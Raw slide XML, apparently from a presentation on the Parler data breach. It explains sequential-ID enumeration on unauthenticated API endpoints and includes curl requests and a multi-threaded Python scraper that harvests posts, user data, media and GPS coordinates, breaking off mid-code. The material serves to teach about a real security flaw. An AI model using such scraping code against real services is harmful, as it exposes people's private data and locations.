              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Security researchers quickly discovered the vulnerability and demonstrated how easily the entire platform could be scraped. Using simple automated scripts with parallel requests, attackers systematically harvested all posts, user data, media files, and sensitive metadata including GPS coordinates from images.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="4153138"/>
            <a:ext cx="73700" cy="92035"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="4270534"/>
            <a:ext cx="4596289" cy="7620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="4322564"/>
            <a:ext cx="967502" cy="120968"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Discovery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="4457819"/>
            <a:ext cx="4596289" cy="78105"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Researchers identified sequential IDs exposed through unauthenticated API endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5017056" y="4153138"/>
            <a:ext cx="73700" cy="92035"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5017056" y="4270534"/>
            <a:ext cx="4596289" cy="7620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5017056" y="4322564"/>
            <a:ext cx="967502" cy="120968"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Mass Scraping</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5017056" y="4457819"/>
            <a:ext cx="4596289" cy="78105"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deployed multi-threaded scripts to systematically download all accessible data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637276" y="4153138"/>
            <a:ext cx="73700" cy="92035"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637276" y="4270534"/>
            <a:ext cx="4596289" cy="7620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637276" y="4322564"/>
            <a:ext cx="967502" cy="120968"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Metadata Extraction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637276" y="4457819"/>
            <a:ext cx="4596289" cy="78105"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Parsed EXIF data from images to extract GPS coordinates and user locations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="4627007"/>
            <a:ext cx="2367082" cy="145018"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Discovery Phase: Sequential ID Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="4807863"/>
            <a:ext cx="13836729" cy="501015"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6180"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393263" y="4807863"/>
            <a:ext cx="13843873" cy="501015"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2207"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="466963" y="4863108"/>
            <a:ext cx="13696474" cy="390525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 Researcher discovered sequential IDs</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curl https://parler.com/api/v1/post/1</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curl https://parler.com/api/v1/post/2</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curl https://parler.com/api/v1/post/3</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 All returned data without authentication!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="5344716"/>
            <a:ext cx="1665684" cy="145018"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Mass Scraping Implementation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396836" y="5525573"/>
            <a:ext cx="6416560" cy="2436494"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 981"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393264" y="5525572"/>
            <a:ext cx="7256474" cy="2603667"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 350"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="466963" y="5580818"/>
            <a:ext cx="5721964" cy="2548422"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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import requests</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import json</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from concurrent.futures import ThreadPoolExecutor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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def scrape_post(post_id):</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 try:                                                                                                                                                                             </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 response = requests.get(f'https://parler.com/api/v1/post/{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>post_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}')</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 if response.status_code == 200:</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 post = response.json()</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 # Extract metadata</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 data = {</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 'id': post['id'],</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 'user': post['user'],</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 'content': post['content'],</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 'timestamp': post['timestamp'],</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 'location': post.get('gps_coordinates'), # GPS data exposed!</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 'media': post.get('media_urls')</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 }</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 # Download associated media</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 if data['media']:</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 for media_url in data['media']:</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 download_media(media_url, post_id)</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 return data</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 except Exception as e:</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 return None</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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def download_media(url, post_id):</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 response = requests.get(url)</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 filename = f"media/{post_id}_{url.split('/')[-1]}"</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 with open(filename, 'wb') as f:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> f.write(response.content)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="550" dirty="0">
              <a:highlight>
                <a:srgbClr val="F2F2F2"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="TextBox 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05CF2D85-5019-C342-B709-1C4B95596C21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3886202" y="6017419"/>
            <a:ext cx="3878578" cy="1446550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># Scrape all posts (estimated 10 million)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ThreadPoolExecutor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>max_workers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>=100) as executor:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>results = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>executor.map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
